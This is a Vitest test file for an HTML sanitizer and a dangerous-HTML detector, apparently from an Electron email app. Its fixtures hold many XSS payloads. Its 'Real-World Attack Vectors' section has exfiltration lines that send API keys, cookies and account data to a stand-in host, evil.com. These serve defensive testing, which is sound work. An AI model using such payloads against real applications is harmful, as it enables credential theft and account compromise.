import { describe, it, expect } from 'vitest';
import { sanitizeHtml, containsDangerousHtml } from '../sanitizeHtml';

describe('sanitizeHtml', () => {
  describe('Script Injection Protection', () => {
    it('should remove <script> tags', () => {
      const malicious = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Hello');
      expect(sanitized).toContain('World');
    });

    it('should remove <script> tags with attributes', () => {
      const malicious = '<script type="text/javascript" src="evil.js"></script>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('evil.js');
    });

    it('should remove inline script tags with various casing', () => {
      const malicious = '<ScRiPt>alert("XSS")</ScRiPt>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('alert');
      expect(sanitized).not.toMatch(/<script/i);
    });

    it('should remove multiple script tags', () => {
      const malicious = '<script>alert(1)</script><p>Safe</p><script>alert(2)</script>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Safe');
    });

    it('should remove nested script tags', () => {
      const malicious = '<div><span><script>alert("nested")</script></span></div>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('<div>');
    });
  });

  describe('Event Handler Protection', () => {
    it('should remove onerror event handlers', () => {
      const malicious = '<img src="x" onerror="alert(\'XSS\')">';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('<img');
    });

    it('should remove onclick event handlers', () => {
      const malicious = '<a href="#" onclick="alert(\'XSS\')">Click me</a>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Click me');
    });

    it('should remove onload event handlers', () => {
      const malicious = '<body onload="alert(\'XSS\')">Content</body>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove onmouseover event handlers', () => {
      const malicious = '<div onmouseover="alert(\'XSS\')">Hover me</div>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onmouseover');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Hover me');
    });

    it('should remove onmouseout event handlers', () => {
      const malicious = '<span onmouseout="alert(\'XSS\')">Text</span>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onmouseout');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Text');
    });

    it('should remove onfocus event handlers', () => {
      const malicious = '<input type="text" onfocus="alert(\'XSS\')">';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onfocus');
      expect(sanitized).not.toContain('alert');
      // input itself should be removed as it's a forbidden tag
      expect(sanitized).not.toContain('<input');
    });

    it('should remove onblur event handlers', () => {
      const malicious = '<textarea onblur="alert(\'XSS\')">Text</textarea>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onblur');
      expect(sanitized).not.toContain('alert');
      // textarea itself should be removed as it's a forbidden tag
      expect(sanitized).not.toContain('<textarea');
    });

    it('should remove multiple different event handlers', () => {
      const malicious = '<div onclick="bad()" onmouseover="worse()" onload="worst()">Content</div>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('onmouseover');
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('bad');
      expect(sanitized).not.toContain('worse');
      expect(sanitized).not.toContain('worst');
      expect(sanitized).toContain('Content');
    });

    it('should remove touch event handlers', () => {
      const malicious = '<div ontouchstart="alert(\'XSS\')">Touch me</div>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('ontouchstart');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Touch me');
    });

    it('should remove animation event handlers', () => {
      const malicious = '<div onanimationend="alert(\'XSS\')">Animate</div>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('onanimationend');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Animate');
    });
  });

  describe('Iframe Injection Protection', () => {
    it('should remove <iframe> tags', () => {
      const malicious = '<p>Safe</p><iframe src="http://evil.com"></iframe>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('evil.com');
      expect(sanitized).toContain('Safe');
    });

    it('should remove <iframe> with javascript: URL', () => {
      const malicious = '<iframe src="javascript:alert(\'XSS\')"></iframe>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });

    it('should remove <iframe> with data URI', () => {
      const malicious = '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('data:text/html');
    });

    it('should remove nested iframes', () => {
      const malicious = '<div><iframe src="evil.com"><iframe src="worse.com"></iframe></iframe></div>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('evil.com');
      expect(sanitized).not.toContain('worse.com');
    });
  });

  describe('JavaScript URL Protection', () => {
    it('should remove javascript: URLs in links', () => {
      const malicious = '<a href="javascript:alert(\'XSS\')">Click</a>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Click');
    });

    it('should remove javascript: URLs with various encodings', () => {
      const malicious = '<a href="javascript&#58;alert(\'XSS\')">Click</a>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('alert');
      expect(sanitized).toContain('Click');
    });

    it('should remove javascript: URLs in images', () => {
      const malicious = '<img src="javascript:alert(\'XSS\')">';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).not.toContain('alert');
    });

    it('should allow safe URLs in links', () => {
      const safe = '<a href="https://example.com">Link</a>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('href="https://example.com"');
      expect(sanitized).toContain('Link');
    });

    it('should allow mailto: URLs', () => {
      const safe = '<a href="mailto:test@example.com">Email</a>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('mailto:test@example.com');
      expect(sanitized).toContain('Email');
    });

    it('should allow tel: URLs', () => {
      const safe = '<a href="tel:+1234567890">Call</a>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('tel:+1234567890');
      expect(sanitized).toContain('Call');
    });
  });

  describe('CSS Injection Protection', () => {
    it('should remove inline style attributes', () => {
      const malicious = '<div style="background: url(javascript:alert(\'XSS\'))">Content</div>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('style=');
      expect(sanitized).not.toContain('javascript:');
      expect(sanitized).toContain('Content');
    });

    it('should remove <style> tags', () => {
      const malicious = '<style>body { background: url(javascript:alert("XSS")); }</style>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<style');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should remove <link> tags for CSS imports', () => {
      const malicious = '<link rel="stylesheet" href="evil.css">';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<link');
      expect(sanitized).not.toContain('evil.css');
    });

    it('should remove inline styles with expression()', () => {
      const malicious = '<div style="width: expression(alert(\'XSS\'))">Content</div>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('style=');
      expect(sanitized).not.toContain('expression');
      expect(sanitized).toContain('Content');
    });
  });

  describe('Object and Embed Protection', () => {
    it('should remove <object> tags', () => {
      const malicious = '<object data="evil.swf"></object>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<object');
      expect(sanitized).not.toContain('evil.swf');
    });

    it('should remove <embed> tags', () => {
      const malicious = '<embed src="evil.swf">';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<embed');
      expect(sanitized).not.toContain('evil.swf');
    });

    it('should remove <applet> tags', () => {
      const malicious = '<applet code="Evil.class">Evil Applet</applet>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<applet');
      expect(sanitized).not.toContain('Evil.class');
    });
  });

  describe('Form Phishing Protection', () => {
    it('should remove <form> tags', () => {
      const malicious = '<form action="http://evil.com/steal"><input type="password"></form>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<form');
      expect(sanitized).not.toContain('evil.com');
    });

    it('should remove <input> tags', () => {
      const malicious = '<input type="text" name="password">';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<input');
    });

    it('should remove <button> tags', () => {
      const malicious = '<button onclick="alert(\'XSS\')">Click</button>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<button');
      expect(sanitized).not.toContain('onclick');
    });

    it('should remove <textarea> tags', () => {
      const malicious = '<textarea name="message">Type here</textarea>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<textarea');
    });

    it('should remove <select> tags', () => {
      const malicious = '<select><option>Choose</option></select>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<select');
      expect(sanitized).not.toContain('<option');
    });
  });

  describe('Media Element Protection', () => {
    it('should remove <audio> tags', () => {
      const malicious = '<audio src="evil.mp3" onerror="alert(\'XSS\')"></audio>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<audio');
      expect(sanitized).not.toContain('onerror');
    });

    it('should remove <video> tags', () => {
      const malicious = '<video src="evil.mp4" onerror="alert(\'XSS\')"></video>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<video');
      expect(sanitized).not.toContain('onerror');
    });

    it('should remove <canvas> tags', () => {
      const malicious = '<canvas id="c"></canvas><script>var c=document.getElementById("c");alert(1)</script>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<canvas');
      expect(sanitized).not.toContain('<script');
    });

    it('should remove <svg> tags', () => {
      const malicious = '<svg onload="alert(\'XSS\')"><circle r="50"/></svg>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<svg');
      expect(sanitized).not.toContain('onload');
    });
  });

  describe('Meta Tag Protection', () => {
    it('should remove <meta> tags', () => {
      const malicious = '<meta http-equiv="refresh" content="0;url=http://evil.com">';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<meta');
      expect(sanitized).not.toContain('evil.com');
    });

    it('should remove <base> tags', () => {
      const malicious = '<base href="http://evil.com/">';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<base');
      expect(sanitized).not.toContain('evil.com');
    });

    it('should remove <title> tags', () => {
      const malicious = '<title>Fake Title</title>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<title');
    });
  });

  describe('Data URI Protection', () => {
    it('should remove data:text/html URIs', () => {
      const malicious = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('data:text/html');
      expect(sanitized).toContain('Click');
    });

    it('should remove data URIs with base64 encoded scripts', () => {
      const malicious = '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>';
      const sanitized = sanitizeHtml(malicious);

      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('data:text/html');
    });
  });

  describe('Safe HTML Preservation', () => {
    it('should preserve text formatting tags', () => {
      const safe = '<p><strong>Bold</strong> <em>Italic</em> <u>Underline</u></p>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('<strong>');
      expect(sanitized).toContain('Bold');
      expect(sanitized).toContain('<em>');
      expect(sanitized).toContain('Italic');
      expect(sanitized).toContain('<u>');
      expect(sanitized).toContain('Underline');
    });

    it('should preserve headings', () => {
      const safe = '<h1>Title</h1><h2>Subtitle</h2><h3>Section</h3>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('<h1>');
      expect(sanitized).toContain('Title');
      expect(sanitized).toContain('<h2>');
      expect(sanitized).toContain('Subtitle');
      expect(sanitized).toContain('<h3>');
      expect(sanitized).toContain('Section');
    });

    it('should preserve lists', () => {
      const safe = '<ul><li>Item 1</li><li>Item 2</li></ul><ol><li>First</li></ol>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('<ul>');
      expect(sanitized).toContain('<li>');
      expect(sanitized).toContain('Item 1');
      expect(sanitized).toContain('<ol>');
      expect(sanitized).toContain('First');
    });

    it('should preserve tables', () => {
      const safe = '<table><thead><tr><th>Header</th></tr></thead><tbody><tr><td>Data</td></tr></tbody></table>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('<table>');
      expect(sanitized).toContain('<thead>');
      expect(sanitized).toContain('<th>');
      expect(sanitized).toContain('Header');
      expect(sanitized).toContain('<tbody>');
      expect(sanitized).toContain('<td>');
      expect(sanitized).toContain('Data');
    });

    it('should preserve safe links', () => {
      const safe = '<a href="https://example.com" title="Example">Link</a>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('<a');
      expect(sanitized).toContain('href="https://example.com"');
      expect(sanitized).toContain('title="Example"');
      expect(sanitized).toContain('Link');
    });

    it('should preserve images with safe src', () => {
      const safe = '<img src="https://example.com/image.jpg" alt="Test Image" width="100" height="100">';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('<img');
      expect(sanitized).toContain('src="https://example.com/image.jpg"');
      expect(sanitized).toContain('alt="Test Image"');
      expect(sanitized).toContain('width="100"');
      expect(sanitized).toContain('height="100"');
    });

    it('should preserve blockquotes', () => {
      const safe = '<blockquote>This is a quote</blockquote>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('<blockquote>');
      expect(sanitized).toContain('This is a quote');
    });

    it('should preserve code blocks', () => {
      const safe = '<pre><code>const x = 5;</code></pre>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('<pre>');
      expect(sanitized).toContain('<code>');
      expect(sanitized).toContain('const x = 5;');
    });

    it('should preserve line breaks', () => {
      const safe = 'Line 1<br>Line 2<br/>Line 3';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('Line 1');
      expect(sanitized).toContain('Line 2');
      expect(sanitized).toContain('Line 3');
      expect(sanitized).toMatch(/<br\s*\/?>/);
    });

    it('should preserve divs and spans', () => {
      const safe = '<div class="container"><span id="text">Content</span></div>';
      const sanitized = sanitizeHtml(safe);

      expect(sanitized).toContain('<div');
      expect(sanitized).toContain('class="container"');
      expect(sanitized).toContain('<span');
      expect(sanitized).toContain('id="text"');
      expect(sanitized).toContain('Content');
    });
  });

  describe('Mixed Content Handling', () => {
    it('should sanitize mixed safe and dangerous content', () => {
      const mixed = `
        <p>This is safe</p>
        <script>alert('dangerous')</script>
        <strong>Also safe</strong>
        <iframe src="evil.com"></iframe>
        <a href="https://example.com">Safe link</a>
        <a href="javascript:alert()">Dangerous link</a>
      `;
      const sanitized = sanitizeHtml(mixed);

      // Safe content preserved
      expect(sanitized).toContain('This is safe');
      expect(sanitized).toContain('<strong>');
      expect(sanitized).toContain('Also safe');
      expect(sanitized).toContain('href="https://example.com"');
      expect(sanitized).toContain('Safe link');

      // Dangerous content removed
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('alert');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('evil.com');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should handle complex nested structures', () => {
      const complex = `
        <div>
          <h2>Email Title</h2>
          <p>Hello <strong>User</strong>,</p>
          <ul>
            <li>Item 1</li>
            <li onclick="alert('xss')">Item 2</li>
          </ul>
          <script>steal()</script>
          <a href="https://safe.com">Safe</a>
        </div>
      `;
      const sanitized = sanitizeHtml(complex);

      // Structure preserved
      expect(sanitized).toContain('<div>');
      expect(sanitized).toContain('<h2>');
      expect(sanitized).toContain('Email Title');
      expect(sanitized).toContain('<p>');
      expect(sanitized).toContain('<strong>');
      expect(sanitized).toContain('User');
      expect(sanitized).toContain('<ul>');
      expect(sanitized).toContain('<li>');
      expect(sanitized).toContain('Item 1');
      expect(sanitized).toContain('Item 2');
      expect(sanitized).toContain('href="https://safe.com"');

      // Dangerous parts removed
      expect(sanitized).not.toContain('onclick');
      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('steal');
    });
  });

  describe('Edge Cases', () => {
    it('should handle null input', () => {
      const sanitized = sanitizeHtml(null);
      expect(sanitized).toBe('');
    });

    it('should handle undefined input', () => {
      const sanitized = sanitizeHtml(undefined);
      expect(sanitized).toBe('');
    });

    it('should handle empty string', () => {
      const sanitized = sanitizeHtml('');
      expect(sanitized).toBe('');
    });

    it('should handle plain text without HTML', () => {
      const text = 'This is plain text with no HTML tags';
      const sanitized = sanitizeHtml(text);
      expect(sanitized).toBe(text);
    });

    it('should handle whitespace-only input', () => {
      const sanitized = sanitizeHtml('   \n\t  ');
      expect(typeof sanitized).toBe('string');
    });

    it('should handle malformed HTML', () => {
      const malformed = '<div><p>Unclosed paragraph<div>Another div</p></div>';
      const sanitized = sanitizeHtml(malformed);

      // Should still process without crashing
      expect(typeof sanitized).toBe('string');
      expect(sanitized).toContain('Unclosed paragraph');
      expect(sanitized).toContain('Another div');
    });

    it('should handle very long HTML strings', () => {
      const long = '<p>' + 'A'.repeat(10000) + '</p>';
      const sanitized = sanitizeHtml(long);

      expect(sanitized).toContain('<p>');
      expect(sanitized.length).toBeGreaterThan(10000);
    });

    it('should handle HTML entities', () => {
      const entities = '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>';
      const sanitized = sanitizeHtml(entities);

      // Entities should be preserved (they're safe)
      expect(sanitized).toContain('&lt;');
      expect(sanitized).toContain('&gt;');
    });

    it('should handle Unicode characters', () => {
      const unicode = '<p>Hello 世界 🌍 مرحبا</p>';
      const sanitized = sanitizeHtml(unicode);

      expect(sanitized).toContain('Hello 世界 🌍 مرحبا');
    });

    it('should handle special characters in attributes', () => {
      const special = '<a href="https://example.com?foo=bar&baz=qux">Link</a>';
      const sanitized = sanitizeHtml(special);

      expect(sanitized).toContain('Link');
      expect(sanitized).toContain('<a');
    });
  });

  describe('Real-World Attack Vectors', () => {
    it('should block XSS via img onerror', () => {
      const attack = '<img src=x onerror="window.electron.resetDb()">';
      const sanitized = sanitizeHtml(attack);

      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('resetDb');
      expect(sanitized).toContain('<img');
    });

    it('should block credential theft via script', () => {
      const attack = '<script>fetch("http://evil.com?creds="+localStorage.getItem("apiKey"))</script>';
      const sanitized = sanitizeHtml(attack);

      expect(sanitized).not.toContain('<script');
      expect(sanitized).not.toContain('fetch');
      expect(sanitized).not.toContain('localStorage');
    });

    it('should block phishing form', () => {
      const attack = `
        <form action="http://evil.com/steal" method="POST">
          <input type="password" name="password" placeholder="Re-enter password">
          <button type="submit">Verify</button>
        </form>
      `;
      const sanitized = sanitizeHtml(attack);

      expect(sanitized).not.toContain('<form');
      expect(sanitized).not.toContain('<input');
      expect(sanitized).not.toContain('<button');
      expect(sanitized).not.toContain('evil.com');
    });

    it('should block data exfiltration via CSS', () => {
      const attack = '<style>body{background:url("http://evil.com/track?data="+document.cookie)}</style>';
      const sanitized = sanitizeHtml(attack);

      expect(sanitized).not.toContain('<style');
      expect(sanitized).not.toContain('evil.com');
      expect(sanitized).not.toContain('document.cookie');
    });

    it('should block hidden iframe for clickjacking', () => {
      const attack = '<iframe src="http://evil.com" style="opacity:0;position:absolute;top:0;left:0"></iframe>';
      const sanitized = sanitizeHtml(attack);

      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('evil.com');
    });

    it('should block IPC bridge access attempts', () => {
      const attack =
        "<img src=x onerror=\"window.electron.getAccounts().then(a=>fetch('http://evil.com',{method:'POST',body:JSON.stringify(a)}))\">";
      const sanitized = sanitizeHtml(attack);

      expect(sanitized).not.toContain('onerror');
      expect(sanitized).not.toContain('window.electron');
      expect(sanitized).not.toContain('getAccounts');
    });
  });
});

describe('containsDangerousHtml', () => {
  describe('Detection of Dangerous Patterns', () => {
    it('should detect <script> tags', () => {
      const dangerous = '<script>alert("XSS")</script>';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });

    it('should detect <iframe> tags', () => {
      const dangerous = '<iframe src="evil.com"></iframe>';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });

    it('should detect javascript: URLs', () => {
      const dangerous = '<a href="javascript:alert(1)">Click</a>';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });

    it('should detect event handlers', () => {
      const dangerous = '<img onerror="alert(1)">';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });

    it('should detect <object> tags', () => {
      const dangerous = '<object data="evil.swf"></object>';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });

    it('should detect <embed> tags', () => {
      const dangerous = '<embed src="evil.swf">';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });

    it('should detect <applet> tags', () => {
      const dangerous = '<applet code="Evil.class"></applet>';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });

    it('should detect <form> tags', () => {
      const dangerous = '<form action="evil.com"></form>';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });

    it('should detect data:text/html URIs', () => {
      const dangerous = '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });

    it('should detect case-insensitive script tags', () => {
      const dangerous = '<ScRiPt>alert(1)</ScRiPt>';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });
  });

  describe('Safe Content Detection', () => {
    it('should not flag safe HTML', () => {
      const safe = '<p>Hello <strong>World</strong></p>';
      expect(containsDangerousHtml(safe)).toBe(false);
    });

    it('should not flag safe links', () => {
      const safe = '<a href="https://example.com">Link</a>';
      expect(containsDangerousHtml(safe)).toBe(false);
    });

    it('should not flag plain text', () => {
      const safe = 'Just plain text with no HTML';
      expect(containsDangerousHtml(safe)).toBe(false);
    });

    it('should handle null input', () => {
      expect(containsDangerousHtml(null)).toBe(false);
    });

    it('should handle undefined input', () => {
      expect(containsDangerousHtml(undefined)).toBe(false);
    });

    it('should handle empty string', () => {
      expect(containsDangerousHtml('')).toBe(false);
    });
  });

  describe('Edge Cases', () => {
    it('should not flag text containing word "script" but not tag', () => {
      const safe = '<p>This is a JavaScript tutorial</p>';
      expect(containsDangerousHtml(safe)).toBe(false);
    });

    it('should flag mixed safe and dangerous content', () => {
      const mixed = '<p>Safe text</p><script>alert(1)</script>';
      expect(containsDangerousHtml(mixed)).toBe(true);
    });

    it('should detect event handlers with various whitespace', () => {
      const dangerous = '<img onerror  =  "alert(1)">';
      expect(containsDangerousHtml(dangerous)).toBe(true);
    });
  });
});
